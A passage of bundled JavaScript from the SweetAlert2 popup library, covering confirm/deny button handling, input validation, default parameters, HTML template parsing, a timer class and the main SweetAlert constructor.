        return !!inputValue && inputValue.toString() === optionValue.toString();
      };
      var _this = void 0;
      var handleConfirmButtonClick = function handleConfirmButtonClick2(instance) {
        var innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.input) {
          handleConfirmOrDenyWithInput(instance, "confirm");
        } else {
          confirm(instance, true);
        }
      };
      var handleDenyButtonClick = function handleDenyButtonClick2(instance) {
        var innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.returnInputValueOnDeny) {
          handleConfirmOrDenyWithInput(instance, "deny");
        } else {
          deny(instance, false);
        }
      };
      var handleCancelButtonClick = function handleCancelButtonClick2(instance, dismissWith) {
        instance.disableButtons();
        dismissWith(DismissReason.cancel);
      };
      var handleConfirmOrDenyWithInput = function handleConfirmOrDenyWithInput2(instance, type) {
        var innerParams = privateProps.innerParams.get(instance);
        if (!innerParams.input) {
          error('The "input" parameter is needed to be set when using returnInputValueOn'.concat(capitalizeFirstLetter(type)));
          return;
        }
        var input = instance.getInput();
        var inputValue = getInputValue(instance, innerParams);
        if (innerParams.inputValidator) {
          handleInputValidator(instance, inputValue, type);
        } else if (input && !input.checkValidity()) {
          instance.enableButtons();
          instance.showValidationMessage(innerParams.validationMessage);
        } else if (type === "deny") {
          deny(instance, inputValue);
        } else {
          confirm(instance, inputValue);
        }
      };
      var handleInputValidator = function handleInputValidator2(instance, inputValue, type) {
        var innerParams = privateProps.innerParams.get(instance);
        instance.disableInput();
        var validationPromise = Promise.resolve().then(function() {
          return asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage));
        });
        validationPromise.then(function(validationMessage) {
          instance.enableButtons();
          instance.enableInput();
          if (validationMessage) {
            instance.showValidationMessage(validationMessage);
          } else if (type === "deny") {
            deny(instance, inputValue);
          } else {
            confirm(instance, inputValue);
          }
        });
      };
      var deny = function deny2(instance, value) {
        var innerParams = privateProps.innerParams.get(instance || _this);
        if (innerParams.showLoaderOnDeny) {
          showLoading(getDenyButton());
        }
        if (innerParams.preDeny) {
          instance.isAwaitingPromise = true;
          var preDenyPromise = Promise.resolve().then(function() {
            return asPromise(innerParams.preDeny(value, innerParams.validationMessage));
          });
          preDenyPromise.then(function(preDenyValue) {
            if (preDenyValue === false) {
              instance.hideLoading();
              handleAwaitingPromise(instance);
            } else {
              instance.close({
                isDenied: true,
                value: typeof preDenyValue === "undefined" ? value : preDenyValue
              });
            }
          })["catch"](function(error2) {
            return rejectWith(instance || _this, error2);
          });
        } else {
          instance.close({
            isDenied: true,
            value
          });
        }
      };
      var succeedWith = function succeedWith2(instance, value) {
        instance.close({
          isConfirmed: true,
          value
        });
      };
      var rejectWith = function rejectWith2(instance, error2) {
        instance.rejectPromise(error2);
      };
      var confirm = function confirm2(instance, value) {
        var innerParams = privateProps.innerParams.get(instance || _this);
        if (innerParams.showLoaderOnConfirm) {
          showLoading();
        }
        if (innerParams.preConfirm) {
          instance.resetValidationMessage();
          instance.isAwaitingPromise = true;
          var preConfirmPromise = Promise.resolve().then(function() {
            return asPromise(innerParams.preConfirm(value, innerParams.validationMessage));
          });
          preConfirmPromise.then(function(preConfirmValue) {
            if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
              instance.hideLoading();
              handleAwaitingPromise(instance);
            } else {
              succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
            }
          })["catch"](function(error2) {
            return rejectWith(instance || _this, error2);
          });
        } else {
          succeedWith(instance, value);
        }
      };
      function hideLoading() {
        var innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
          return;
        }
        var domCache = privateProps.domCache.get(this);
        hide(domCache.loader);
        if (isToast()) {
          if (innerParams.icon) {
            show(getIcon());
          }
        } else {
          showRelatedButton(domCache);
        }
        removeClass([domCache.popup, domCache.actions], swalClasses.loading);
        domCache.popup.removeAttribute("aria-busy");
        domCache.popup.removeAttribute("data-loading");
        domCache.confirmButton.disabled = false;
        domCache.denyButton.disabled = false;
        domCache.cancelButton.disabled = false;
      }
      var showRelatedButton = function showRelatedButton2(domCache) {
        var buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
        if (buttonToReplace.length) {
          show(buttonToReplace[0], "inline-block");
        } else if (allButtonsAreHidden()) {
          hide(domCache.actions);
        }
      };
      function getInput() {
        var innerParams = privateProps.innerParams.get(this);
        var domCache = privateProps.domCache.get(this);
        if (!domCache) {
          return null;
        }
        return getInput$1(domCache.popup, innerParams.input);
      }
      function setButtonsDisabled(instance, buttons, disabled) {
        var domCache = privateProps.domCache.get(instance);
        buttons.forEach(function(button) {
          domCache[button].disabled = disabled;
        });
      }
      function setInputDisabled(input, disabled) {
        var popup = getPopup();
        if (!popup || !input) {
          return;
        }
        if (input.type === "radio") {
          var radios = popup.querySelectorAll('[name="'.concat(swalClasses.radio, '"]'));
          for (var i = 0; i < radios.length; i++) {
            radios[i].disabled = disabled;
          }
        } else {
          input.disabled = disabled;
        }
      }
      function enableButtons() {
        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
      }
      function disableButtons() {
        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
      }
      function enableInput() {
        setInputDisabled(this.getInput(), false);
      }
      function disableInput() {
        setInputDisabled(this.getInput(), true);
      }
      function showValidationMessage(error2) {
        var domCache = privateProps.domCache.get(this);
        var params = privateProps.innerParams.get(this);
        setInnerHtml(domCache.validationMessage, error2);
        domCache.validationMessage.className = swalClasses["validation-message"];
        if (params.customClass && params.customClass.validationMessage) {
          addClass(domCache.validationMessage, params.customClass.validationMessage);
        }
        show(domCache.validationMessage);
        var input = this.getInput();
        if (input) {
          input.setAttribute("aria-invalid", "true");
          input.setAttribute("aria-describedby", swalClasses["validation-message"]);
          focusInput(input);
          addClass(input, swalClasses.inputerror);
        }
      }
      function resetValidationMessage() {
        var domCache = privateProps.domCache.get(this);
        if (domCache.validationMessage) {
          hide(domCache.validationMessage);
        }
        var input = this.getInput();
        if (input) {
          input.removeAttribute("aria-invalid");
          input.removeAttribute("aria-describedby");
          removeClass(input, swalClasses.inputerror);
        }
      }
      var defaultParams = {
        title: "",
        titleText: "",
        text: "",
        html: "",
        footer: "",
        icon: void 0,
        iconColor: void 0,
        iconHtml: void 0,
        template: void 0,
        toast: false,
        animation: true,
        showClass: {
          popup: "swal2-show",
          backdrop: "swal2-backdrop-show",
          icon: "swal2-icon-show"
        },
        hideClass: {
          popup: "swal2-hide",
          backdrop: "swal2-backdrop-hide",
          icon: "swal2-icon-hide"
        },
        customClass: {},
        target: "body",
        color: void 0,
        backdrop: true,
        heightAuto: true,
        allowOutsideClick: true,
        allowEscapeKey: true,
        allowEnterKey: true,
        stopKeydownPropagation: true,
        keydownListenerCapture: false,
        showConfirmButton: true,
        showDenyButton: false,
        showCancelButton: false,
        preConfirm: void 0,
        preDeny: void 0,
        confirmButtonText: "OK",
        confirmButtonAriaLabel: "",
        confirmButtonColor: void 0,
        denyButtonText: "No",
        denyButtonAriaLabel: "",
        denyButtonColor: void 0,
        cancelButtonText: "Cancel",
        cancelButtonAriaLabel: "",
        cancelButtonColor: void 0,
        buttonsStyling: true,
        reverseButtons: false,
        focusConfirm: true,
        focusDeny: false,
        focusCancel: false,
        returnFocus: true,
        showCloseButton: false,
        closeButtonHtml: "&times;",
        closeButtonAriaLabel: "Close this dialog",
        loaderHtml: "",
        showLoaderOnConfirm: false,
        showLoaderOnDeny: false,
        imageUrl: void 0,
        imageWidth: void 0,
        imageHeight: void 0,
        imageAlt: "",
        timer: void 0,
        timerProgressBar: false,
        width: void 0,
        padding: void 0,
        background: void 0,
        input: void 0,
        inputPlaceholder: "",
        inputLabel: "",
        inputValue: "",
        inputOptions: {},
        inputAutoFocus: true,
        inputAutoTrim: true,
        inputAttributes: {},
        inputValidator: void 0,
        returnInputValueOnDeny: false,
        validationMessage: void 0,
        grow: false,
        position: "center",
        progressSteps: [],
        currentProgressStep: void 0,
        progressStepsDistance: void 0,
        willOpen: void 0,
        didOpen: void 0,
        didRender: void 0,
        willClose: void 0,
        didClose: void 0,
        didDestroy: void 0,
        scrollbarPadding: true
      };
      var updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
      var deprecatedParams = {};
      var toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
      var isValidParameter = function isValidParameter2(paramName) {
        return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
      };
      var isUpdatableParameter = function isUpdatableParameter2(paramName) {
        return updatableParams.indexOf(paramName) !== -1;
      };
      var isDeprecatedParameter = function isDeprecatedParameter2(paramName) {
        return deprecatedParams[paramName];
      };
      var checkIfParamIsValid = function checkIfParamIsValid2(param) {
        if (!isValidParameter(param)) {
          warn('Unknown parameter "'.concat(param, '"'));
        }
      };
      var checkIfToastParamIsValid = function checkIfToastParamIsValid2(param) {
        if (toastIncompatibleParams.includes(param)) {
          warn('The parameter "'.concat(param, '" is incompatible with toasts'));
        }
      };
      var checkIfParamIsDeprecated = function checkIfParamIsDeprecated2(param) {
        var isDeprecated = isDeprecatedParameter(param);
        if (isDeprecated) {
          warnAboutDeprecation(param, isDeprecated);
        }
      };
      var showWarningsForParams = function showWarningsForParams2(params) {
        if (params.backdrop === false && params.allowOutsideClick) {
          warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
        }
        for (var param in params) {
          checkIfParamIsValid(param);
          if (params.toast) {
            checkIfToastParamIsValid(param);
          }
          checkIfParamIsDeprecated(param);
        }
      };
      function update(params) {
        var popup = getPopup();
        var innerParams = privateProps.innerParams.get(this);
        if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
          warn("You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.");
          return;
        }
        var validUpdatableParams = filterValidParams(params);
        var updatedParams = Object.assign({}, innerParams, validUpdatableParams);
        render(this, updatedParams);
        privateProps.innerParams.set(this, updatedParams);
        Object.defineProperties(this, {
          params: {
            value: Object.assign({}, this.params, params),
            writable: false,
            enumerable: true
          }
        });
      }
      var filterValidParams = function filterValidParams2(params) {
        var validUpdatableParams = {};
        Object.keys(params).forEach(function(param) {
          if (isUpdatableParameter(param)) {
            validUpdatableParams[param] = params[param];
          } else {
            warn("Invalid parameter to update: ".concat(param));
          }
        });
        return validUpdatableParams;
      };
      function _destroy() {
        var domCache = privateProps.domCache.get(this);
        var innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
          disposeWeakMaps(this);
          return;
        }
        if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
          globalState.swalCloseEventFinishedCallback();
          delete globalState.swalCloseEventFinishedCallback;
        }
        if (typeof innerParams.didDestroy === "function") {
          innerParams.didDestroy();
        }
        disposeSwal(this);
      }
      var disposeSwal = function disposeSwal2(instance) {
        disposeWeakMaps(instance);
        delete instance.params;
        delete globalState.keydownHandler;
        delete globalState.keydownTarget;
        delete globalState.currentInstance;
      };
      var disposeWeakMaps = function disposeWeakMaps2(instance) {
        if (instance.isAwaitingPromise) {
          unsetWeakMaps(privateProps, instance);
          instance.isAwaitingPromise = true;
        } else {
          unsetWeakMaps(privateMethods, instance);
          unsetWeakMaps(privateProps, instance);
          delete instance.isAwaitingPromise;
          delete instance.disableButtons;
          delete instance.enableButtons;
          delete instance.getInput;
          delete instance.disableInput;
          delete instance.enableInput;
          delete instance.hideLoading;
          delete instance.disableLoading;
          delete instance.showValidationMessage;
          delete instance.resetValidationMessage;
          delete instance.close;
          delete instance.closePopup;
          delete instance.closeModal;
          delete instance.closeToast;
          delete instance.rejectPromise;
          delete instance.update;
          delete instance._destroy;
        }
      };
      var unsetWeakMaps = function unsetWeakMaps2(obj, instance) {
        for (var i in obj) {
          obj[i]["delete"](instance);
        }
      };
      var instanceMethods = /* @__PURE__ */ Object.freeze({
        __proto__: null,
        _destroy,
        close,
        closeModal: close,
        closePopup: close,
        closeToast: close,
        disableButtons,
        disableInput,
        disableLoading: hideLoading,
        enableButtons,
        enableInput,
        getInput,
        handleAwaitingPromise,
        hideLoading,
        rejectPromise,
        resetValidationMessage,
        showValidationMessage,
        update
      });
      var handlePopupClick = function handlePopupClick2(innerParams, domCache, dismissWith) {
        if (innerParams.toast) {
          handleToastClick(innerParams, domCache, dismissWith);
        } else {
          handleModalMousedown(domCache);
          handleContainerMousedown(domCache);
          handleModalClick(innerParams, domCache, dismissWith);
        }
      };
      var handleToastClick = function handleToastClick2(innerParams, domCache, dismissWith) {
        domCache.popup.onclick = function() {
          if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
            return;
          }
          dismissWith(DismissReason.close);
        };
      };
      var isAnyButtonShown = function isAnyButtonShown2(innerParams) {
        return !!(innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton);
      };
      var ignoreOutsideClick = false;
      var handleModalMousedown = function handleModalMousedown2(domCache) {
        domCache.popup.onmousedown = function() {
          domCache.container.onmouseup = function(e) {
            domCache.container.onmouseup = function() {
            };
            if (e.target === domCache.container) {
              ignoreOutsideClick = true;
            }
          };
        };
      };
      var handleContainerMousedown = function handleContainerMousedown2(domCache) {
        domCache.container.onmousedown = function() {
          domCache.popup.onmouseup = function(e) {
            domCache.popup.onmouseup = function() {
            };
            if (e.target === domCache.popup || e.target instanceof HTMLElement && domCache.popup.contains(e.target)) {
              ignoreOutsideClick = true;
            }
          };
        };
      };
      var handleModalClick = function handleModalClick2(innerParams, domCache, dismissWith) {
        domCache.container.onclick = function(e) {
          if (ignoreOutsideClick) {
            ignoreOutsideClick = false;
            return;
          }
          if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
            dismissWith(DismissReason.backdrop);
          }
        };
      };
      var isJqueryElement = function isJqueryElement2(elem) {
        return _typeof(elem) === "object" && elem.jquery;
      };
      var isElement = function isElement2(elem) {
        return elem instanceof Element || isJqueryElement(elem);
      };
      var argsToParams = function argsToParams2(args) {
        var params = {};
        if (_typeof(args[0]) === "object" && !isElement(args[0])) {
          Object.assign(params, args[0]);
        } else {
          ["title", "html", "icon"].forEach(function(name, index) {
            var arg = args[index];
            if (typeof arg === "string" || isElement(arg)) {
              params[name] = arg;
            } else if (arg !== void 0) {
              error("Unexpected type of ".concat(name, '! Expected "string" or "Element", got ').concat(_typeof(arg)));
            }
          });
        }
        return params;
      };
      function fire() {
        var Swal16 = this;
        for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
          args[_key] = arguments[_key];
        }
        return _construct(Swal16, args);
      }
      function mixin(mixinParams) {
        var MixinSwal = /* @__PURE__ */ function(_this2) {
          _inherits(MixinSwal2, _this2);
          var _super = _createSuper(MixinSwal2);
          function MixinSwal2() {
            _classCallCheck(this, MixinSwal2);
            return _super.apply(this, arguments);
          }
          _createClass(MixinSwal2, [{
            key: "_main",
            value: function _main(params, priorityMixinParams) {
              return _get(_getPrototypeOf(MixinSwal2.prototype), "_main", this).call(this, params, Object.assign({}, mixinParams, priorityMixinParams));
            }
          }]);
          return MixinSwal2;
        }(this);
        return MixinSwal;
      }
      var getTimerLeft = function getTimerLeft2() {
        return globalState.timeout && globalState.timeout.getTimerLeft();
      };
      var stopTimer = function stopTimer2() {
        if (globalState.timeout) {
          stopTimerProgressBar();
          return globalState.timeout.stop();
        }
      };
      var resumeTimer = function resumeTimer2() {
        if (globalState.timeout) {
          var remaining = globalState.timeout.start();
          animateTimerProgressBar(remaining);
          return remaining;
        }
      };
      var toggleTimer = function toggleTimer2() {
        var timer = globalState.timeout;
        return timer && (timer.running ? stopTimer() : resumeTimer());
      };
      var increaseTimer = function increaseTimer2(ms) {
        if (globalState.timeout) {
          var remaining = globalState.timeout.increase(ms);
          animateTimerProgressBar(remaining, true);
          return remaining;
        }
      };
      var isTimerRunning = function isTimerRunning2() {
        return !!(globalState.timeout && globalState.timeout.isRunning());
      };
      var bodyClickListenerAdded = false;
      var clickHandlers = {};
      function bindClickHandler() {
        var attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
        clickHandlers[attr] = this;
        if (!bodyClickListenerAdded) {
          document.body.addEventListener("click", bodyClickListener);
          bodyClickListenerAdded = true;
        }
      }
      var bodyClickListener = function bodyClickListener2(event) {
        for (var el = event.target; el && el !== document; el = el.parentNode) {
          for (var attr in clickHandlers) {
            var template = el.getAttribute(attr);
            if (template) {
              clickHandlers[attr].fire({
                template
              });
              return;
            }
          }
        }
      };
      var staticMethods = /* @__PURE__ */ Object.freeze({
        __proto__: null,
        argsToParams,
        bindClickHandler,
        clickCancel,
        clickConfirm,
        clickDeny,
        enableLoading: showLoading,
        fire,
        getActions,
        getCancelButton,
        getCloseButton,
        getConfirmButton,
        getContainer,
        getDenyButton,
        getFocusableElements,
        getFooter,
        getHtmlContainer,
        getIcon,
        getIconContent,
        getImage,
        getInputLabel,
        getLoader,
        getPopup,
        getProgressSteps,
        getTimerLeft,
        getTimerProgressBar,
        getTitle,
        getValidationMessage,
        increaseTimer,
        isDeprecatedParameter,
        isLoading,
        isTimerRunning,
        isUpdatableParameter,
        isValidParameter,
        isVisible,
        mixin,
        resumeTimer,
        showLoading,
        stopTimer,
        toggleTimer
      });
      var Timer = /* @__PURE__ */ function() {
        function Timer2(callback, delay) {
          _classCallCheck(this, Timer2);
          this.callback = callback;
          this.remaining = delay;
          this.running = false;
          this.start();
        }
        _createClass(Timer2, [{
          key: "start",
          value: function start() {
            if (!this.running) {
              this.running = true;
              this.started = /* @__PURE__ */ new Date();
              this.id = setTimeout(this.callback, this.remaining);
            }
            return this.remaining;
          }
          /**
           * @returns {number}
           */
        }, {
          key: "stop",
          value: function stop() {
            if (this.started && this.running) {
              this.running = false;
              clearTimeout(this.id);
              this.remaining -= (/* @__PURE__ */ new Date()).getTime() - this.started.getTime();
            }
            return this.remaining;
          }
          /**
           * @param {number} n
           * @returns {number}
           */
        }, {
          key: "increase",
          value: function increase(n) {
            var running = this.running;
            if (running) {
              this.stop();
            }
            this.remaining += n;
            if (running) {
              this.start();
            }
            return this.remaining;
          }
          /**
           * @returns {number}
           */
        }, {
          key: "getTimerLeft",
          value: function getTimerLeft2() {
            if (this.running) {
              this.stop();
              this.start();
            }
            return this.remaining;
          }
          /**
           * @returns {boolean}
           */
        }, {
          key: "isRunning",
          value: function isRunning() {
            return this.running;
          }
        }]);
        return Timer2;
      }();
      var swalStringParams = ["swal-title", "swal-html", "swal-footer"];
      var getTemplateParams = function getTemplateParams2(params) {
        var template = typeof params.template === "string" ? document.querySelector(params.template) : params.template;
        if (!template) {
          return {};
        }
        var templateContent = template.content;
        showWarningsForElements(templateContent);
        var result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
        return result;
      };
      var getSwalParams = function getSwalParams2(templateContent) {
        var result = {};
        var swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
        swalParams.forEach(function(param) {
          showWarningsForAttributes(param, ["name", "value"]);
          var paramName = param.getAttribute("name");
          var value = param.getAttribute("value");
          if (typeof defaultParams[paramName] === "boolean") {
            result[paramName] = value !== "false";
          } else if (_typeof(defaultParams[paramName]) === "object") {
            result[paramName] = JSON.parse(value);
          } else {
            result[paramName] = value;
          }
        });
        return result;
      };
      var getSwalFunctionParams = function getSwalFunctionParams2(templateContent) {
        var result = {};
        var swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
        swalFunctions.forEach(function(param) {
          var paramName = param.getAttribute("name");
          var value = param.getAttribute("value");
          result[paramName] = new Function("return ".concat(value))();
        });
        return result;
      };
      var getSwalButtons = function getSwalButtons2(templateContent) {
        var result = {};
        var swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
        swalButtons.forEach(function(button) {
          showWarningsForAttributes(button, ["type", "color", "aria-label"]);
          var type = button.getAttribute("type");
          result["".concat(type, "ButtonText")] = button.innerHTML;
          result["show".concat(capitalizeFirstLetter(type), "Button")] = true;
          if (button.hasAttribute("color")) {
            result["".concat(type, "ButtonColor")] = button.getAttribute("color");
          }
          if (button.hasAttribute("aria-label")) {
            result["".concat(type, "ButtonAriaLabel")] = button.getAttribute("aria-label");
          }
        });
        return result;
      };
      var getSwalImage = function getSwalImage2(templateContent) {
        var result = {};
        var image = templateContent.querySelector("swal-image");
        if (image) {
          showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
          if (image.hasAttribute("src")) {
            result.imageUrl = image.getAttribute("src");
          }
          if (image.hasAttribute("width")) {
            result.imageWidth = image.getAttribute("width");
          }
          if (image.hasAttribute("height")) {
            result.imageHeight = image.getAttribute("height");
          }
          if (image.hasAttribute("alt")) {
            result.imageAlt = image.getAttribute("alt");
          }
        }
        return result;
      };
      var getSwalIcon = function getSwalIcon2(templateContent) {
        var result = {};
        var icon = templateContent.querySelector("swal-icon");
        if (icon) {
          showWarningsForAttributes(icon, ["type", "color"]);
          if (icon.hasAttribute("type")) {
            result.icon = icon.getAttribute("type");
          }
          if (icon.hasAttribute("color")) {
            result.iconColor = icon.getAttribute("color");
          }
          result.iconHtml = icon.innerHTML;
        }
        return result;
      };
      var getSwalInput = function getSwalInput2(templateContent) {
        var result = {};
        var input = templateContent.querySelector("swal-input");
        if (input) {
          showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
          result.input = input.getAttribute("type") || "text";
          if (input.hasAttribute("label")) {
            result.inputLabel = input.getAttribute("label");
          }
          if (input.hasAttribute("placeholder")) {
            result.inputPlaceholder = input.getAttribute("placeholder");
          }
          if (input.hasAttribute("value")) {
            result.inputValue = input.getAttribute("value");
          }
        }
        var inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
        if (inputOptions.length) {
          result.inputOptions = {};
          inputOptions.forEach(function(option) {
            showWarningsForAttributes(option, ["value"]);
            var optionValue = option.getAttribute("value");
            var optionName = option.innerHTML;
            result.inputOptions[optionValue] = optionName;
          });
        }
        return result;
      };
      var getSwalStringParams = function getSwalStringParams2(templateContent, paramNames) {
        var result = {};
        for (var i in paramNames) {
          var paramName = paramNames[i];
          var tag = templateContent.querySelector(paramName);
          if (tag) {
            showWarningsForAttributes(tag, []);
            result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
          }
        }
        return result;
      };
      var showWarningsForElements = function showWarningsForElements2(templateContent) {
        var allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
        Array.from(templateContent.children).forEach(function(el) {
          var tagName = el.tagName.toLowerCase();
          if (!allowedElements.includes(tagName)) {
            warn("Unrecognized element <".concat(tagName, ">"));
          }
        });
      };
      var showWarningsForAttributes = function showWarningsForAttributes2(el, allowedAttributes) {
        Array.from(el.attributes).forEach(function(attribute) {
          if (allowedAttributes.indexOf(attribute.name) === -1) {
            warn(['Unrecognized attribute "'.concat(attribute.name, '" on <').concat(el.tagName.toLowerCase(), ">."), "".concat(allowedAttributes.length ? "Allowed attributes are: ".concat(allowedAttributes.join(", ")) : "To set the value, use HTML within the element.")]);
          }
        });
      };
      var SHOW_CLASS_TIMEOUT = 10;
      var openPopup = function openPopup2(params) {
        var container = getContainer();
        var popup = getPopup();
        if (typeof params.willOpen === "function") {
          params.willOpen(popup);
        }
        var bodyStyles = window.getComputedStyle(document.body);
        var initialBodyOverflow = bodyStyles.overflowY;
        addClasses(container, popup, params);
        setTimeout(function() {
          setScrollingVisibility(container, popup);
        }, SHOW_CLASS_TIMEOUT);
        if (isModal()) {
          fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
          setAriaHidden();
        }
        if (!isToast() && !globalState.previousActiveElement) {
          globalState.previousActiveElement = document.activeElement;
        }
        if (typeof params.didOpen === "function") {
          setTimeout(function() {
            return params.didOpen(popup);
          });
        }
        removeClass(container, swalClasses["no-transition"]);
      };
      var swalOpenAnimationFinished = function swalOpenAnimationFinished2(event) {
        var popup = getPopup();
        if (event.target !== popup || !animationEndEvent) {
          return;
        }
        var container = getContainer();
        popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished2);
        container.style.overflowY = "auto";
      };
      var setScrollingVisibility = function setScrollingVisibility2(container, popup) {
        if (animationEndEvent && hasCssAnimation(popup)) {
          container.style.overflowY = "hidden";
          popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
        } else {
          container.style.overflowY = "auto";
        }
      };
      var fixScrollContainer = function fixScrollContainer2(container, scrollbarPadding, initialBodyOverflow) {
        iOSfix();
        if (scrollbarPadding && initialBodyOverflow !== "hidden") {
          replaceScrollbarWithPadding(initialBodyOverflow);
        }
        setTimeout(function() {
          container.scrollTop = 0;
        });
      };
      var addClasses = function addClasses2(container, popup, params) {
        addClass(container, params.showClass.backdrop);
        if (params.animation) {
          popup.style.setProperty("opacity", "0", "important");
          show(popup, "grid");
          setTimeout(function() {
            addClass(popup, params.showClass.popup);
            popup.style.removeProperty("opacity");
          }, SHOW_CLASS_TIMEOUT);
        } else {
          show(popup, "grid");
        }
        addClass([document.documentElement, document.body], swalClasses.shown);
        if (params.heightAuto && params.backdrop && !params.toast) {
          addClass([document.documentElement, document.body], swalClasses["height-auto"]);
        }
      };
      var defaultInputValidators = {
        /**
         * @param {string} string
         * @param {string} [validationMessage]
         * @returns {Promise<string | void>}
         */
        email: function email(string, validationMessage) {
          return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
        },
        /**
         * @param {string} string
         * @param {string} [validationMessage]
         * @returns {Promise<string | void>}
         */
        url: function url(string, validationMessage) {
          return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
        }
      };
      function setDefaultInputValidators(params) {
        if (params.inputValidator) {
          return;
        }
        if (params.input === "email") {
          params.inputValidator = defaultInputValidators["email"];
        }
        if (params.input === "url") {
          params.inputValidator = defaultInputValidators["url"];
        }
      }
      function validateCustomTargetElement(params) {
        if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
          warn('Target parameter is not valid, defaulting to "body"');
          params.target = "body";
        }
      }
      function setParameters(params) {
        setDefaultInputValidators(params);
        if (params.showLoaderOnConfirm && !params.preConfirm) {
          warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
        }
        validateCustomTargetElement(params);
        if (typeof params.title === "string") {
          params.title = params.title.split("\n").join("<br />");
        }
        init(params);
      }
      var currentInstance;
      var _promise = /* @__PURE__ */ new WeakMap();
      var SweetAlert = /* @__PURE__ */ function() {
        function SweetAlert2() {
          _classCallCheck(this, SweetAlert2);
          _classPrivateFieldInitSpec(this, _promise, {
            writable: true,
            value: void 0
          });
          if (typeof window === "undefined") {
            return;
          }
          currentInstance = this;
          for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
            args[_key] = arguments[_key];
          }
          var outerParams = Object.freeze(this.constructor.argsToParams(args));
          this.params = outerParams;
          this.isAwaitingPromise = false;
          _classPrivateFieldSet(this, _promise, this._main(currentInstance.params));
        }
        _createClass(SweetAlert2, [{
          key: "_main",
          value: function _main(userParams) {
            var mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
            showWarningsForParams(Object.assign({}, mixinParams, userParams));
            if (globalState.currentInstance) {
              var swalPromiseResolve = privateMethods.swalPromiseResolve.get(globalState.currentInstance);
              var isAwaitingPromise = globalState.currentInstance.isAwaitingPromise;
              globalState.currentInstance._destroy();
              if (!isAwaitingPromise) {
                swalPromiseResolve({
                  isDismissed: true
                });
              }
              if (isModal()) {
                unsetAriaHidden();
              }
            }
            globalState.currentInstance = currentInstance;
            var innerParams = prepareParams(userParams, mixinParams);
            setParameters(innerParams);
            Object.freeze(innerParams);
            if (globalState.timeout) {
              globalState.timeout.stop();
              delete globalState.timeout;
            }
            clearTimeout(globalState.restoreFocusTimeout);
            var domCache = populateDomCache(currentInstance);
            render(currentInstance, innerParams);
            privateProps.innerParams.set(currentInstance, innerParams);
            return swalPromise(currentInstance, domCache, innerParams);
          }
          // `catch` cannot be the name of a module export, so we define our thenable methods here instead
        }, {
          key: "then",
          value: function then(onFulfilled) {
            return _classPrivateFieldGet(this, _promise).then(onFulfilled);
          }
        }, {
          key: "finally",
          value: function _finally(onFinally) {
            return _classPrivateFieldGet(this, _promise)["finally"](onFinally);
          }
        }]);
        return SweetAlert2;
      }();
      var swalPromise = function swalPromise2(instance, domCache, innerParams) {
        return new Promise(function(resolve, reject) {
          var dismissWith = function dismissWith2(dismiss) {
            instance.close({
              isDismissed: true,
              dismiss
            });
          };
